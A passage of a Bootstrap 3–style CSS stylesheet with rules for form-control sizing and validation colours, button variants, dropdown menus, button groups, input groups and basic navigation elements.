            .input-group-lg > select.input-group-addon,
            .input-group-lg > .input-group-btn > select.btn {
                height: 46px;
                line-height: 46px;
            }
            textarea.input-lg,
            .input-group-lg > textarea.form-control,
            .input-group-lg > textarea.input-group-addon,
            .input-group-lg > .input-group-btn > textarea.btn,
            select.input-lg[multiple],
            .input-group-lg > .form-control[multiple],
            .input-group-lg > .input-group-addon[multiple],
            .input-group-lg > .input-group-btn > .btn[multiple] {
                height: auto;
            }
            .form-group-lg .form-control {
                height: 46px;
                padding: 10px 16px;
                font-size: 18px;
                line-height: 1.3333333;
                border-radius: 6px;
            }
            .form-group-lg select.form-control {
                height: 46px;
                line-height: 46px;
            }
            .form-group-lg textarea.form-control,
            .form-group-lg select.form-control[multiple] {
                height: auto;
            }
            .form-group-lg .form-control-static {
                height: 46px;
                min-height: 38px;
                padding: 11px 16px;
                font-size: 18px;
                line-height: 1.3333333;
            }
            .has-feedback {
                position: relative;
            }
            .has-feedback .form-control {
                padding-right: 42.5px;
            }
            .form-control-feedback {
                position: absolute;
                top: 0;
                right: 0;
                z-index: 2;
                display: block;
                width: 34px;
                height: 34px;
                line-height: 34px;
                text-align: center;
                pointer-events: none;
            }
            .input-lg + .form-control-feedback,
            .input-group-lg > .form-control + .form-control-feedback,
            .input-group-lg > .input-group-addon + .form-control-feedback,
            .input-group-lg > .input-group-btn > .btn + .form-control-feedback,
            .input-group-lg + .form-control-feedback,
            .form-group-lg .form-control + .form-control-feedback {
                width: 46px;
                height: 46px;
                line-height: 46px;
            }
            .input-sm + .form-control-feedback,
            .input-group-sm > .form-control + .form-control-feedback,
            .input-group-sm > .input-group-addon + .form-control-feedback,
            .input-group-sm > .input-group-btn > .btn + .form-control-feedback,
            .input-group-sm + .form-control-feedback,
            .form-group-sm .form-control + .form-control-feedback {
                width: 30px;
                height: 30px;
                line-height: 30px;
            }
            .has-success .help-block,
            .has-success .control-label,
            .has-success .radio,
            .has-success .checkbox,
            .has-success .radio-inline,
            .has-success .checkbox-inline,
            .has-success.radio label,
            .has-success.checkbox label,
            .has-success.radio-inline label,
            .has-success.checkbox-inline label {
                color: #3c763d;
            }
            .has-success .form-control {
                border-color: #3c763d;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            }
            .has-success .form-control:focus {
                border-color: #2b542c;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #67b168;
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #67b168;
            }
            .has-success .input-group-addon {
                color: #3c763d;
                border-color: #3c763d;
                background-color: #dff0d8;
            }
            .has-success .form-control-feedback {
                color: #3c763d;
            }
            .has-warning .help-block,
            .has-warning .control-label,
            .has-warning .radio,
            .has-warning .checkbox,
            .has-warning .radio-inline,
            .has-warning .checkbox-inline,
            .has-warning.radio label,
            .has-warning.checkbox label,
            .has-warning.radio-inline label,
            .has-warning.checkbox-inline label {
                color: #8a6d3b;
            }
            .has-warning .form-control {
                border-color: #8a6d3b;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            }
            .has-warning .form-control:focus {
                border-color: #66512c;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #c0a16b;
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #c0a16b;
            }
            .has-warning .input-group-addon {
                color: #8a6d3b;
                border-color: #8a6d3b;
                background-color: #fcf8e3;
            }
            .has-warning .form-control-feedback {
                color: #8a6d3b;
            }
            .has-error .help-block,
            .has-error .control-label,
            .has-error .radio,
            .has-error .checkbox,
            .has-error .radio-inline,
            .has-error .checkbox-inline,
            .has-error.radio label,
            .has-error.checkbox label,
            .has-error.radio-inline label,
            .has-error.checkbox-inline label {
                color: #a94442;
            }
            .has-error .form-control {
                border-color: #a94442;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            }
            .has-error .form-control:focus {
                border-color: #843534;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ce8483;
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ce8483;
            }
            .has-error .input-group-addon {
                color: #a94442;
                border-color: #a94442;
                background-color: #f2dede;
            }
            .has-error .form-control-feedback {
                color: #a94442;
            }
            .has-feedback label ~ .form-control-feedback {
                top: 25px;
            }
            .has-feedback label.sr-only ~ .form-control-feedback {
                top: 0;
            }
            .help-block {
                display: block;
                margin-top: 5px;
                margin-bottom: 10px;
                color: #737373;
            }
            @media (min-width: 768px) {
                .form-inline .form-group {
                    display: inline-block;
                    margin-bottom: 0;
                    vertical-align: middle;
                }
                .form-inline .form-control {
                    display: inline-block;
                    width: auto;
                    vertical-align: middle;
                }
                .form-inline .form-control-static {
                    display: inline-block;
                }
                .form-inline .input-group {
                    display: inline-table;
                    vertical-align: middle;
                }
                .form-inline .input-group .input-group-addon,
                .form-inline .input-group .input-group-btn,
                .form-inline .input-group .form-control {
                    width: auto;
                }
                .form-inline .input-group > .form-control {
                    width: 100%;
                }
                .form-inline .control-label {
                    margin-bottom: 0;
                    vertical-align: middle;
                }
                .form-inline .radio,
                .form-inline .checkbox {
                    display: inline-block;
                    margin-top: 0;
                    margin-bottom: 0;
                    vertical-align: middle;
                }
                .form-inline .radio label,
                .form-inline .checkbox label {
                    padding-left: 0;
                }
                .form-inline .radio input[type="radio"],
                .form-inline .checkbox input[type="checkbox"] {
                    position: relative;
                    margin-left: 0;
                }
                .form-inline .has-feedback .form-control-feedback {
                    top: 0;
                }
            }
            .form-horizontal .radio,
            .form-horizontal .checkbox,
            .form-horizontal .radio-inline,
            .form-horizontal .checkbox-inline {
                margin-top: 0;
                margin-bottom: 0;
                padding-top: 7px;
            }
            .form-horizontal .radio,
            .form-horizontal .checkbox {
                min-height: 27px;
            }
            .form-horizontal .form-group {
                margin-left: -15px;
                margin-right: -15px;
            }
            .form-horizontal .form-group:before,
            .form-horizontal .form-group:after {
                content: " ";
                display: table;
            }
            .form-horizontal .form-group:after {
                clear: both;
            }
            @media (min-width: 768px) {
                .form-horizontal .control-label {
                    text-align: right;
                    margin-bottom: 0;
                    padding-top: 7px;
                }
            }
            .form-horizontal .has-feedback .form-control-feedback {
                right: 15px;
            }
            @media (min-width: 768px) {
                .form-horizontal .form-group-lg .control-label {
                    padding-top: 11px;
                    font-size: 18px;
                }
            }
            @media (min-width: 768px) {
                .form-horizontal .form-group-sm .control-label {
                    padding-top: 6px;
                    font-size: 12px;
                }
            }
            .btn {
                display: inline-block;
                margin-bottom: 0;
                font-weight: normal;
                text-align: center;
                vertical-align: middle;
                touch-action: manipulation;
                cursor: pointer;
                background-image: none;
                border: 1px solid transparent;
                white-space: nowrap;
                padding: 6px 12px;
                font-size: 14px;
                line-height: 1.428571429;
                border-radius: 4px;
                -webkit-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }
            .btn:focus,
            .btn.focus,
            .btn:active:focus,
            .btn.focus:active,
            .btn.active:focus,
            .btn.active.focus {
                outline: 5px auto -webkit-focus-ring-color;
                outline-offset: -2px;
            }
            .btn:hover,
            .btn:focus,
            .btn.focus {
                color: #333;
                text-decoration: none;
            }
            .btn:active,
            .btn.active {
                outline: 0;
                background-image: none;
                -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
                box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
            }
            .btn.disabled,
            .btn[disabled],
            fieldset[disabled] .btn {
                cursor: not-allowed;
                opacity: 0.65;
                filter: alpha(opacity=65);
                -webkit-box-shadow: none;
                box-shadow: none;
            }
            a.btn.disabled,
            fieldset[disabled] a.btn {
                pointer-events: none;
            }
            .btn-default {
                color: #333;
                background-color: #fff;
                border-color: #ccc;
            }
            .btn-default:focus,
            .btn-default.focus {
                color: #333;
                background-color: #e6e6e6;
                border-color: #8c8c8c;
            }
            .btn-default:hover {
                color: #333;
                background-color: #e6e6e6;
                border-color: #adadad;
            }
            .btn-default:active,
            .btn-default.active,
            .open > .btn-default.dropdown-toggle {
                color: #333;
                background-color: #e6e6e6;
                border-color: #adadad;
            }
            .btn-default:active:hover,
            .btn-default:active:focus,
            .btn-default.focus:active,
            .btn-default.active:hover,
            .btn-default.active:focus,
            .btn-default.active.focus,
            .open > .btn-default.dropdown-toggle:hover,
            .open > .btn-default.dropdown-toggle:focus,
            .open > .btn-default.dropdown-toggle.focus {
                color: #333;
                background-color: #d4d4d4;
                border-color: #8c8c8c;
            }
            .btn-default:active,
            .btn-default.active,
            .open > .btn-default.dropdown-toggle {
                background-image: none;
            }
            .btn-default.disabled:hover,
            .btn-default.disabled:focus,
            .btn-default.disabled.focus,
            .btn-default[disabled]:hover,
            .btn-default[disabled]:focus,
            .btn-default.focus[disabled],
            fieldset[disabled] .btn-default:hover,
            fieldset[disabled] .btn-default:focus,
            fieldset[disabled] .btn-default.focus {
                background-color: #fff;
                border-color: #ccc;
            }
            .btn-default .badge {
                color: #fff;
                background-color: #333;
            }
            .btn-primary {
                color: #fff;
                background-color: #337ab7;
                border-color: #2e6da4;
            }
            .btn-primary:focus,
            .btn-primary.focus {
                color: #fff;
                background-color: #286090;
                border-color: #122b40;
            }
            .btn-primary:hover {
                color: #fff;
                background-color: #286090;
                border-color: #204d74;
            }
            .btn-primary:active,
            .btn-primary.active,
            .open > .btn-primary.dropdown-toggle {
                color: #fff;
                background-color: #286090;
                border-color: #204d74;
            }
            .btn-primary:active:hover,
            .btn-primary:active:focus,
            .btn-primary.focus:active,
            .btn-primary.active:hover,
            .btn-primary.active:focus,
            .btn-primary.active.focus,
            .open > .btn-primary.dropdown-toggle:hover,
            .open > .btn-primary.dropdown-toggle:focus,
            .open > .btn-primary.dropdown-toggle.focus {
                color: #fff;
                background-color: #204d74;
                border-color: #122b40;
            }
            .btn-primary:active,
            .btn-primary.active,
            .open > .btn-primary.dropdown-toggle {
                background-image: none;
            }
            .btn-primary.disabled:hover,
            .btn-primary.disabled:focus,
            .btn-primary.disabled.focus,
            .btn-primary[disabled]:hover,
            .btn-primary[disabled]:focus,
            .btn-primary.focus[disabled],
            fieldset[disabled] .btn-primary:hover,
            fieldset[disabled] .btn-primary:focus,
            fieldset[disabled] .btn-primary.focus {
                background-color: #337ab7;
                border-color: #2e6da4;
            }
            .btn-primary .badge {
                color: #337ab7;
                background-color: #fff;
            }
            .btn-success {
                color: #fff;
                background-color: #5cb85c;
                border-color: #4cae4c;
            }
            .btn-success:focus,
            .btn-success.focus {
                color: #fff;
                background-color: #449d44;
                border-color: #255625;
            }
            .btn-success:hover {
                color: #fff;
                background-color: #449d44;
                border-color: #398439;
            }
            .btn-success:active,
            .btn-success.active,
            .open > .btn-success.dropdown-toggle {
                color: #fff;
                background-color: #449d44;
                border-color: #398439;
            }
            .btn-success:active:hover,
            .btn-success:active:focus,
            .btn-success.focus:active,
            .btn-success.active:hover,
            .btn-success.active:focus,
            .btn-success.active.focus,
            .open > .btn-success.dropdown-toggle:hover,
            .open > .btn-success.dropdown-toggle:focus,
            .open > .btn-success.dropdown-toggle.focus {
                color: #fff;
                background-color: #398439;
                border-color: #255625;
            }
            .btn-success:active,
            .btn-success.active,
            .open > .btn-success.dropdown-toggle {
                background-image: none;
            }
            .btn-success.disabled:hover,
            .btn-success.disabled:focus,
            .btn-success.disabled.focus,
            .btn-success[disabled]:hover,
            .btn-success[disabled]:focus,
            .btn-success.focus[disabled],
            fieldset[disabled] .btn-success:hover,
            fieldset[disabled] .btn-success:focus,
            fieldset[disabled] .btn-success.focus {
                background-color: #5cb85c;
                border-color: #4cae4c;
            }
            .btn-success .badge {
                color: #5cb85c;
                background-color: #fff;
            }
            .btn-info {
                color: #fff;
                background-color: #5bc0de;
                border-color: #46b8da;
            }
            .btn-info:focus,
            .btn-info.focus {
                color: #fff;
                background-color: #31b0d5;
                border-color: #1b6d85;
            }
            .btn-info:hover {
                color: #fff;
                background-color: #31b0d5;
                border-color: #269abc;
            }
            .btn-info:active,
            .btn-info.active,
            .open > .btn-info.dropdown-toggle {
                color: #fff;
                background-color: #31b0d5;
                border-color: #269abc;
            }
            .btn-info:active:hover,
            .btn-info:active:focus,
            .btn-info.focus:active,
            .btn-info.active:hover,
            .btn-info.active:focus,
            .btn-info.active.focus,
            .open > .btn-info.dropdown-toggle:hover,
            .open > .btn-info.dropdown-toggle:focus,
            .open > .btn-info.dropdown-toggle.focus {
                color: #fff;
                background-color: #269abc;
                border-color: #1b6d85;
            }
            .btn-info:active,
            .btn-info.active,
            .open > .btn-info.dropdown-toggle {
                background-image: none;
            }
            .btn-info.disabled:hover,
            .btn-info.disabled:focus,
            .btn-info.disabled.focus,
            .btn-info[disabled]:hover,
            .btn-info[disabled]:focus,
            .btn-info.focus[disabled],
            fieldset[disabled] .btn-info:hover,
            fieldset[disabled] .btn-info:focus,
            fieldset[disabled] .btn-info.focus {
                background-color: #5bc0de;
                border-color: #46b8da;
            }
            .btn-info .badge {
                color: #5bc0de;
                background-color: #fff;
            }
            .btn-warning {
                color: #fff;
                background-color: #f0ad4e;
                border-color: #eea236;
            }
            .btn-warning:focus,
            .btn-warning.focus {
                color: #fff;
                background-color: #ec971f;
                border-color: #985f0d;
            }
            .btn-warning:hover {
                color: #fff;
                background-color: #ec971f;
                border-color: #d58512;
            }
            .btn-warning:active,
            .btn-warning.active,
            .open > .btn-warning.dropdown-toggle {
                color: #fff;
                background-color: #ec971f;
                border-color: #d58512;
            }
            .btn-warning:active:hover,
            .btn-warning:active:focus,
            .btn-warning.focus:active,
            .btn-warning.active:hover,
            .btn-warning.active:focus,
            .btn-warning.active.focus,
            .open > .btn-warning.dropdown-toggle:hover,
            .open > .btn-warning.dropdown-toggle:focus,
            .open > .btn-warning.dropdown-toggle.focus {
                color: #fff;
                background-color: #d58512;
                border-color: #985f0d;
            }
            .btn-warning:active,
            .btn-warning.active,
            .open > .btn-warning.dropdown-toggle {
                background-image: none;
            }
            .btn-warning.disabled:hover,
            .btn-warning.disabled:focus,
            .btn-warning.disabled.focus,
            .btn-warning[disabled]:hover,
            .btn-warning[disabled]:focus,
            .btn-warning.focus[disabled],
            fieldset[disabled] .btn-warning:hover,
            fieldset[disabled] .btn-warning:focus,
            fieldset[disabled] .btn-warning.focus {
                background-color: #f0ad4e;
                border-color: #eea236;
            }
            .btn-warning .badge {
                color: #f0ad4e;
                background-color: #fff;
            }
            .btn-danger {
                color: #fff;
                background-color: #d9534f;
                border-color: #d43f3a;
            }
            .btn-danger:focus,
            .btn-danger.focus {
                color: #fff;
                background-color: #c9302c;
                border-color: #761c19;
            }
            .btn-danger:hover {
                color: #fff;
                background-color: #c9302c;
                border-color: #ac2925;
            }
            .btn-danger:active,
            .btn-danger.active,
            .open > .btn-danger.dropdown-toggle {
                color: #fff;
                background-color: #c9302c;
                border-color: #ac2925;
            }
            .btn-danger:active:hover,
            .btn-danger:active:focus,
            .btn-danger.focus:active,
            .btn-danger.active:hover,
            .btn-danger.active:focus,
            .btn-danger.active.focus,
            .open > .btn-danger.dropdown-toggle:hover,
            .open > .btn-danger.dropdown-toggle:focus,
            .open > .btn-danger.dropdown-toggle.focus {
                color: #fff;
                background-color: #ac2925;
                border-color: #761c19;
            }
            .btn-danger:active,
            .btn-danger.active,
            .open > .btn-danger.dropdown-toggle {
                background-image: none;
            }
            .btn-danger.disabled:hover,
            .btn-danger.disabled:focus,
            .btn-danger.disabled.focus,
            .btn-danger[disabled]:hover,
            .btn-danger[disabled]:focus,
            .btn-danger.focus[disabled],
            fieldset[disabled] .btn-danger:hover,
            fieldset[disabled] .btn-danger:focus,
            fieldset[disabled] .btn-danger.focus {
                background-color: #d9534f;
                border-color: #d43f3a;
            }
            .btn-danger .badge {
                color: #d9534f;
                background-color: #fff;
            }
            .btn-link {
                color: #337ab7;
                font-weight: normal;
                border-radius: 0;
            }
            .btn-link,
            .btn-link:active,
            .btn-link.active,
            .btn-link[disabled],
            fieldset[disabled] .btn-link {
                background-color: transparent;
                -webkit-box-shadow: none;
                box-shadow: none;
            }
            .btn-link,
            .btn-link:hover,
            .btn-link:focus,
            .btn-link:active {
                border-color: transparent;
            }
            .btn-link:hover,
            .btn-link:focus {
                color: #23527c;
                text-decoration: underline;
                background-color: transparent;
            }
            .btn-link[disabled]:hover,
            .btn-link[disabled]:focus,
            fieldset[disabled] .btn-link:hover,
            fieldset[disabled] .btn-link:focus {
                color: #777777;
                text-decoration: none;
            }
            .btn-lg,
            .btn-group-lg > .btn {
                padding: 10px 16px;
                font-size: 18px;
                line-height: 1.3333333;
                border-radius: 6px;
            }
            .btn-sm,
            .btn-group-sm > .btn {
                padding: 5px 10px;
                font-size: 12px;
                line-height: 1.5;
                border-radius: 3px;
            }
            .btn-xs,
            .btn-group-xs > .btn {
                padding: 1px 5px;
                font-size: 12px;
                line-height: 1.5;
                border-radius: 3px;
            }
            .btn-block {
                display: block;
                width: 100%;
            }
            .btn-block + .btn-block {
                margin-top: 5px;
            }
            input.btn-block[type="submit"],
            input.btn-block[type="reset"],
            input.btn-block[type="button"] {
                width: 100%;
            }
            .fade {
                opacity: 0;
                -webkit-transition: opacity 0.15s linear;
                -o-transition: opacity 0.15s linear;
                transition: opacity 0.15s linear;
            }
            .fade.in {
                opacity: 1;
            }
            .collapse {
                display: none;
            }
            .collapse.in {
                display: block;
            }
            tr.collapse.in {
                display: table-row;
            }
            tbody.collapse.in {
                display: table-row-group;
            }
            .collapsing {
                position: relative;
                height: 0;
                overflow: hidden;
                -webkit-transition-property: height, visibility;
                transition-property: height, visibility;
                -webkit-transition-duration: 0.35s;
                transition-duration: 0.35s;
                -webkit-transition-timing-function: ease;
                transition-timing-function: ease;
            }
            .caret {
                display: inline-block;
                width: 0;
                height: 0;
                margin-left: 2px;
                vertical-align: middle;
                border-top: 4px dashed;
                border-top: 4px solid \9;
                border-right: 4px solid transparent;
                border-left: 4px solid transparent;
            }
            .dropup,
            .dropdown {
                position: relative;
            }
            .dropdown-toggle:focus {
                outline: 0;
            }
            .dropdown-menu {
                position: absolute;
                top: 100%;
                left: 0;
                z-index: 1000;
                display: none;
                float: left;
                min-width: 160px;
                padding: 5px 0;
                margin: 2px 0 0;
                list-style: none;
                font-size: 14px;
                text-align: left;
                background-color: #fff;
                border: 1px solid #ccc;
                border: 1px solid rgba(0, 0, 0, 0.15);
                border-radius: 4px;
                -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.175);
                box-shadow: 0 6px 12px rgba(0, 0, 0, 0.175);
                background-clip: padding-box;
            }
            .dropdown-menu.pull-right {
                right: 0;
                left: auto;
            }
            .dropdown-menu .divider {
                height: 1px;
                margin: 9px 0;
                overflow: hidden;
                background-color: #e5e5e5;
            }
            .dropdown-menu > li > a {
                display: block;
                padding: 3px 20px;
                clear: both;
                font-weight: normal;
                line-height: 1.428571429;
                color: #333333;
                white-space: nowrap;
            }
            .dropdown-menu > li > a:hover,
            .dropdown-menu > li > a:focus {
                text-decoration: none;
                color: #262626;
                background-color: #f5f5f5;
            }
            .dropdown-menu > .active > a,
            .dropdown-menu > .active > a:hover,
            .dropdown-menu > .active > a:focus {
                color: #fff;
                text-decoration: none;
                outline: 0;
                background-color: #337ab7;
            }
            .dropdown-menu > .disabled > a,
            .dropdown-menu > .disabled > a:hover,
            .dropdown-menu > .disabled > a:focus {
                color: #777777;
            }
            .dropdown-menu > .disabled > a:hover,
            .dropdown-menu > .disabled > a:focus {
                text-decoration: none;
                background-color: transparent;
                background-image: none;
                filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
                cursor: not-allowed;
            }
            .open > .dropdown-menu {
                display: block;
            }
            .open > a {
                outline: 0;
            }
            .dropdown-menu-right {
                left: auto;
                right: 0;
            }
            .dropdown-menu-left {
                left: 0;
                right: auto;
            }
            .dropdown-header {
                display: block;
                padding: 3px 20px;
                font-size: 12px;
                line-height: 1.428571429;
                color: #777777;
                white-space: nowrap;
            }
            .dropdown-backdrop {
                position: fixed;
                left: 0;
                right: 0;
                bottom: 0;
                top: 0;
                z-index: 990;
            }
            .pull-right > .dropdown-menu {
                right: 0;
                left: auto;
            }
            .dropup .caret,
            .navbar-fixed-bottom .dropdown .caret {
                border-top: 0;
                border-bottom: 4px dashed;
                border-bottom: 4px solid \9;
                content: "";
            }
            .dropup .dropdown-menu,
            .navbar-fixed-bottom .dropdown .dropdown-menu {
                top: auto;
                bottom: 100%;
                margin-bottom: 2px;
            }
            @media (min-width: 768px) {
                .navbar-right .dropdown-menu {
                    right: 0;
                    left: auto;
                }
                .navbar-right .dropdown-menu-left {
                    left: 0;
                    right: auto;
                }
            }
            .btn-group,
            .btn-group-vertical {
                position: relative;
                display: inline-block;
                vertical-align: middle;
            }
            .btn-group > .btn,
            .btn-group-vertical > .btn {
                position: relative;
                float: left;
            }
            .btn-group > .btn:hover,
            .btn-group > .btn:focus,
            .btn-group > .btn:active,
            .btn-group > .btn.active,
            .btn-group-vertical > .btn:hover,
            .btn-group-vertical > .btn:focus,
            .btn-group-vertical > .btn:active,
            .btn-group-vertical > .btn.active {
                z-index: 2;
            }
            .btn-group .btn + .btn,
            .btn-group .btn + .btn-group,
            .btn-group .btn-group + .btn,
            .btn-group .btn-group + .btn-group {
                margin-left: -1px;
            }
            .btn-toolbar {
                margin-left: -5px;
            }
            .btn-toolbar:before,
            .btn-toolbar:after {
                content: " ";
                display: table;
            }
            .btn-toolbar:after {
                clear: both;
            }
            .btn-toolbar .btn,
            .btn-toolbar .btn-group,
            .btn-toolbar .input-group {
                float: left;
            }
            .btn-toolbar > .btn,
            .btn-toolbar > .btn-group,
            .btn-toolbar > .input-group {
                margin-left: 5px;
            }
            .btn-group > .btn:not(:first-child):not(:last-child):not(.dropdown-toggle) {
                border-radius: 0;
            }
            .btn-group > .btn:first-child {
                margin-left: 0;
            }
            .btn-group > .btn:first-child:not(:last-child):not(.dropdown-toggle) {
                border-bottom-right-radius: 0;
                border-top-right-radius: 0;
            }
            .btn-group > .btn:last-child:not(:first-child),
            .btn-group > .dropdown-toggle:not(:first-child) {
                border-bottom-left-radius: 0;
                border-top-left-radius: 0;
            }
            .btn-group > .btn-group {
                float: left;
            }
            .btn-group > .btn-group:not(:first-child):not(:last-child) > .btn {
                border-radius: 0;
            }
            .btn-group > .btn-group:first-child:not(:last-child) > .btn:last-child,
            .btn-group > .btn-group:first-child:not(:last-child) > .dropdown-toggle {
                border-bottom-right-radius: 0;
                border-top-right-radius: 0;
            }
            .btn-group > .btn-group:last-child:not(:first-child) > .btn:first-child {
                border-bottom-left-radius: 0;
                border-top-left-radius: 0;
            }
            .btn-group .dropdown-toggle:active,
            .btn-group.open .dropdown-toggle {
                outline: 0;
            }
            .btn-group > .btn + .dropdown-toggle {
                padding-left: 8px;
                padding-right: 8px;
            }
            .btn-group > .btn-lg + .dropdown-toggle,
            .btn-group-lg.btn-group > .btn + .dropdown-toggle {
                padding-left: 12px;
                padding-right: 12px;
            }
            .btn-group.open .dropdown-toggle {
                -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
                box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
            }
            .btn-group.open .dropdown-toggle.btn-link {
                -webkit-box-shadow: none;
                box-shadow: none;
            }
            .btn .caret {
                margin-left: 0;
            }
            .btn-lg .caret,
            .btn-group-lg > .btn .caret {
                border-width: 5px 5px 0;
                border-bottom-width: 0;
            }
            .dropup .btn-lg .caret,
            .dropup .btn-group-lg > .btn .caret {
                border-width: 0 5px 5px;
            }
            .btn-group-vertical > .btn,
            .btn-group-vertical > .btn-group,
            .btn-group-vertical > .btn-group > .btn {
                display: block;
                float: none;
                width: 100%;
                max-width: 100%;
            }
            .btn-group-vertical > .btn-group:before,
            .btn-group-vertical > .btn-group:after {
                content: " ";
                display: table;
            }
            .btn-group-vertical > .btn-group:after {
                clear: both;
            }
            .btn-group-vertical > .btn-group > .btn {
                float: none;
            }
            .btn-group-vertical > .btn + .btn,
            .btn-group-vertical > .btn + .btn-group,
            .btn-group-vertical > .btn-group + .btn,
            .btn-group-vertical > .btn-group + .btn-group {
                margin-top: -1px;
                margin-left: 0;
            }
            .btn-group-vertical > .btn:not(:first-child):not(:last-child) {
                border-radius: 0;
            }
            .btn-group-vertical > .btn:first-child:not(:last-child) {
                border-top-right-radius: 4px;
                border-top-left-radius: 4px;
                border-bottom-right-radius: 0;
                border-bottom-left-radius: 0;
            }
            .btn-group-vertical > .btn:last-child:not(:first-child) {
                border-top-right-radius: 0;
                border-top-left-radius: 0;
                border-bottom-right-radius: 4px;
                border-bottom-left-radius: 4px;
            }
            .btn-group-vertical > .btn-group:not(:first-child):not(:last-child) > .btn {
                border-radius: 0;
            }
            .btn-group-vertical > .btn-group:first-child:not(:last-child) > .btn:last-child,
            .btn-group-vertical > .btn-group:first-child:not(:last-child) > .dropdown-toggle {
                border-bottom-right-radius: 0;
                border-bottom-left-radius: 0;
            }
            .btn-group-vertical > .btn-group:last-child:not(:first-child) > .btn:first-child {
                border-top-right-radius: 0;
                border-top-left-radius: 0;
            }
            .btn-group-justified {
                display: table;
                width: 100%;
                table-layout: fixed;
                border-collapse: separate;
            }
            .btn-group-justified > .btn,
            .btn-group-justified > .btn-group {
                float: none;
                display: table-cell;
                width: 1%;
            }
            .btn-group-justified > .btn-group .btn {
                width: 100%;
            }
            .btn-group-justified > .btn-group .dropdown-menu {
                left: auto;
            }
            [data-toggle="buttons"] > .btn input[type="radio"],
            [data-toggle="buttons"] > .btn input[type="checkbox"],
            [data-toggle="buttons"] > .btn-group > .btn input[type="radio"],
            [data-toggle="buttons"] > .btn-group > .btn input[type="checkbox"] {
                position: absolute;
                clip: rect(0, 0, 0, 0);
                pointer-events: none;
            }
            .input-group {
                position: relative;
                display: table;
                border-collapse: separate;
            }
            .input-group[class*="col-"] {
                float: none;
                padding-left: 0;
                padding-right: 0;
            }
            .input-group .form-control {
                position: relative;
                z-index: 2;
                float: left;
                width: 100%;
                margin-bottom: 0;
            }
            .input-group .form-control:focus {
                z-index: 3;
            }
            .input-group-addon,
            .input-group-btn,
            .input-group .form-control {
                display: table-cell;
            }
            .input-group-addon:not(:first-child):not(:last-child),
            .input-group-btn:not(:first-child):not(:last-child),
            .input-group .form-control:not(:first-child):not(:last-child) {
                border-radius: 0;
            }
            .input-group-addon,
            .input-group-btn {
                width: 1%;
                white-space: nowrap;
                vertical-align: middle;
            }
            .input-group-addon {
                padding: 6px 12px;
                font-size: 14px;
                font-weight: normal;
                line-height: 1;
                color: #555555;
                text-align: center;
                background-color: #eeeeee;
                border: 1px solid #ccc;
                border-radius: 4px;
            }
            .input-group-addon.input-sm,
            .input-group-sm > .input-group-addon,
            .input-group-sm > .input-group-btn > .input-group-addon.btn {
                padding: 5px 10px;
                font-size: 12px;
                border-radius: 3px;
            }
            .input-group-addon.input-lg,
            .input-group-lg > .input-group-addon,
            .input-group-lg > .input-group-btn > .input-group-addon.btn {
                padding: 10px 16px;
                font-size: 18px;
                border-radius: 6px;
            }
            .input-group-addon input[type="radio"],
            .input-group-addon input[type="checkbox"] {
                margin-top: 0;
            }
            .input-group .form-control:first-child,
            .input-group-addon:first-child,
            .input-group-btn:first-child > .btn,
            .input-group-btn:first-child > .btn-group > .btn,
            .input-group-btn:first-child > .dropdown-toggle,
            .input-group-btn:last-child > .btn:not(:last-child):not(.dropdown-toggle),
            .input-group-btn:last-child > .btn-group:not(:last-child) > .btn {
                border-bottom-right-radius: 0;
                border-top-right-radius: 0;
            }
            .input-group-addon:first-child {
                border-right: 0;
            }
            .input-group .form-control:last-child,
            .input-group-addon:last-child,
            .input-group-btn:last-child > .btn,
            .input-group-btn:last-child > .btn-group > .btn,
            .input-group-btn:last-child > .dropdown-toggle,
            .input-group-btn:first-child > .btn:not(:first-child),
            .input-group-btn:first-child > .btn-group:not(:first-child) > .btn {
                border-bottom-left-radius: 0;
                border-top-left-radius: 0;
            }
            .input-group-addon:last-child {
                border-left: 0;
            }
            .input-group-btn {
                position: relative;
                font-size: 0;
                white-space: nowrap;
            }
            .input-group-btn > .btn {
                position: relative;
            }
            .input-group-btn > .btn + .btn {
                margin-left: -1px;
            }
            .input-group-btn > .btn:hover,
            .input-group-btn > .btn:focus,
            .input-group-btn > .btn:active {
                z-index: 2;
            }
            .input-group-btn:first-child > .btn,
            .input-group-btn:first-child > .btn-group {
                margin-right: -1px;
            }
            .input-group-btn:last-child > .btn,
            .input-group-btn:last-child > .btn-group {
                z-index: 2;
                margin-left: -1px;
            }
            .nav {
                margin-bottom: 0;
                padding-left: 0;
                list-style: none;
            }
            .nav:before,
            .nav:after {
                content: " ";
                display: table;
            }
            .nav:after {
                clear: both;
            }
            .nav > li {
                position: relative;
                display: block;
            }
            .nav > li > a {
                position: relative;
                display: block;
                padding: 10px 15px;
            }
            .nav > li > a:hover,
            .nav > li > a:focus {
                text-decoration: none;
                background-color: #eeeeee;
            }
            .nav > li.disabled > a {
                color: #777777;
            }
            .nav > li.disabled > a:hover,
            .nav > li.disabled > a:focus {
                color: #777777;
                text-decoration: none;
                background-color: transparent;
                cursor: not-allowed;
            }
            .nav .open > a,
            .nav .open > a:hover,
            .nav .open > a:focus {
                background-color: #eeeeee;
                border-color: #337ab7;
            }
            .nav .nav-divider {
                height: 1px;
                margin: 9px 0;
                overflow: hidden;
                background-color: #e5e5e5;
            }
            .nav > li > a > img {
                max-width: none;
            }
            .nav-tabs {
                border-bottom: 1px solid #ddd;
            }
